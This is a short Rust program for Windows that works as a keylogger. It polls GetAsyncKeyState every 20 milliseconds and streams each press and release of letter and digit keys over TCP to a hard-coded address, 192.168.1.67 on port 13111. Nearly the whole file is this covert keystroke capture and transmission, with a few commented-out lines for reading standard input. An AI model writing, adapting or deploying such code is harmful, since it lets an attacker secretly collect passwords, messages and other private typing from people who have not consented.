extern crate user32;

use std::net::TcpStream;
use std::io::Write;
//use std::io::Read;

fn main() {
    let mut stream = TcpStream::connect("192.168.1.67:13111").expect("Can't connect to port: ");
    //let mut stdin = std::io::stdin();
    //let mut line_buffer = String::new();

    let mut previous_key_state: Vec<bool> = Vec::new();
    previous_key_state.resize(255, false);
    loop {
        std::thread::sleep(std::time::Duration::from_millis(20));

        for i in 8..255u8 {
            let mut is_current_key_down: bool;
            unsafe {
                is_current_key_down = user32::GetAsyncKeyState(i as i32) & (1 << 15) != 0;
            }
            if previous_key_state[i as usize] != is_current_key_down {
                previous_key_state[i as usize] = is_current_key_down;
                match i {
                    0x30 ... 0x5A => {
                        stream.write( &[i, is_current_key_down as u8]).expect("Failed to write");
                    },
                    _ => {}
                }
            }
        }
//        line_buffer.clear();
//        stdin.read_line(&mut line_buffer);
//        stream.write( line_buffer.trim().as_bytes()).expect("Failed to write");
    }

}
